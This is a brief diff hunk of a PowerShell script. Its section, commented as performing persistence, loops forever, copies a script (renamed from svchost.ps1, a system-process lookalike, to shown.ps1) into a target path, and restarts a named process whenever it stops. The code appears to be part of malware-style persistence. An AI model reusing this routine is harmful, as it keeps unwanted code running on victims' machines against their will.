@@ -14,6 +14,6 @@ $pathtest = Test-Path $path+"\hidden.ps1" -ErrorAction SilentlyContinue
 #perofm persistance
 while(1 -eq 1){$open = Get-Process $persist -ErrorAction SilentlyContinue
 if($pathtest -eq $false){
-copy svchost.ps1 $path -ErrorAction SilentlyContinue} 
+copy shown.ps1 $path -ErrorAction SilentlyContinue} 
 if ($open -eq $null){start $persist}  
 }
